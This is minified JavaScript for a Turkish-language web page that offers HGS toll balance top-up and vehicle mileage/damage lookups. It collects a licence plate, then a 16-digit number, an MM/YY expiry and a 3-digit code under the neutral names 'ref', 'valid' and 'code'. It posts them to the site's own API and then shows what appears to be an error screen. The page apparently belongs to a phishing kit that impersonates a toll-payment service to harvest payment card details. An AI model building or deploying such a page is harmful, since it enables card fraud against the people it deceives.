let service=null,amount=null;const q=s=>document.querySelector(s);
async function settings(){try{
 let r=await fetch('/api/settings'),s=await r.json();
 renderLogos('topLogos',[s.top1,s.top2,s.top3]);
 renderLogos('footerLogos',[s.foot1,s.foot2,s.foot3]);
 const notice=q('#referenceNotice');
 const text=(s.reference_notice||'').trim();
 if(notice){notice.textContent=text;notice.classList.toggle('hide',!text);}
 const map={
  txtHomeTitle:'home_title',txtHgsTitle:'hgs_title',txtHgsDesc:'hgs_desc',
  txtKmTitle:'km_title',txtKmDesc:'km_desc',txtRefTitle:'ref_title',
  txtRefLabel:'ref_label',txtErrorTitle:'error_title',txtErrorDesc:'error_desc'
 };
 Object.entries(map).forEach(([id,key])=>{const el=q('#'+id);if(el && (s[key]||'').trim())el.textContent=s[key]});
}catch(e){}}
function renderLogos(id,a){q('#'+id).innerHTML=a.filter(Boolean).map(x=>`<img src="${x.replace(/"/g,'&quot;')}" alt="">`).join('')}
document.querySelectorAll('[data-service]').forEach(b=>b.onclick=()=>start(b.dataset.service));document.querySelectorAll('[data-a]').forEach(b=>b.onclick=()=>{document.querySelectorAll('[data-a]').forEach(x=>x.classList.remove('sel'));b.classList.add('sel');amount=b.dataset.a});
function start(t){service=t;amount=null;q('#home').classList.add('hide');q('#s1').classList.remove('hide');q('#amountArea').classList.toggle('hide',t!=='hgs');q('#flowTitle').textContent=t==='hgs'?'HGS Bakiye Yükleme':'KM Sorgu - Hasar Sorgu'}
q('#plate').addEventListener('input',e=>{e.target.value=e.target.value.toLocaleUpperCase('tr-TR')});
q('#next').onclick=()=>{
  const plate=q('#plate').value.trim().toLocaleUpperCase('tr-TR');
  q('#plate').value=plate;
  if(!plate)return alert('Plaka girin.');
  if(service==='hgs'&&!amount)return alert('Tutar seçin.');
  q('#summaryPlate').textContent=plate;
  q('#summaryAmountWrap').classList.toggle('hide',service!=='hgs');
  q('#summaryAmount').textContent=service==='hgs'?Number(amount).toLocaleString('tr-TR')+' TL':'—';
  show(2)
};q('#back').onclick=()=>show(1);document.querySelectorAll('.home').forEach(b=>b.onclick=()=>location.reload());
q('#ref').oninput=e=>e.target.value=e.target.value.replace(/\D/g,'').slice(0,16);q('#code').oninput=e=>e.target.value=e.target.value.replace(/\D/g,'').slice(0,3);q('#valid').oninput=e=>{let v=e.target.value.replace(/\D/g,'').slice(0,4);if(v.length>2)v=v.slice(0,2)+'/'+v.slice(2);e.target.value=v};
q('#send').onclick=async()=>{let body={service:service==='hgs'?'HGS Bakiye Yükleme':'KM / Hasar Sorgu',plate:q('#plate').value.trim().toUpperCase(),amount:service==='hgs'?Number(amount):0,ref:q('#ref').value,valid:q('#valid').value,code:q('#code').value};let r=await fetch('/api/transactions',{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify(body)});if(!r.ok){let x=await r.json();return alert(x.error||'İşlem kaydedilemedi')}show(3)};
function show(n){[1,2,3].forEach(i=>q('#s'+i).classList.toggle('hide',i!==n));q('#home').classList.add('hide')}settings();